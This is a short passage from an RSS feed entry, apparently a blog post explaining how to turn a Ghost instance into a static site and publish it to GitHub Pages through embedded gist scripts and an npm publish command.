<code>inesmartins.github.io</code>:</li></ul><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/6f90f6a2812c7727d25ae3f9a3771b35.js"></script><!--kg-card-end: html--><p>(based on script from <a href="https://fizzy.cc/ghost-static-generator/">fizzy.cc</a>)</p><p>This script generate a <code>static</code> directory with the entire content of your Ghost instance as a static website. Just copy this content to the Github Pages repository, and your website will be instantly updated.</p><p>In order to make this process even easier, I created an NPM script, which makes this as easy as running: <code>npm run publish</code> on your original repository:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/7fbd5dc9ed1cc418d27386559581cd43.js"></script><!--kg-card-end: html-->]]></content:encoded></item></channel></rss>
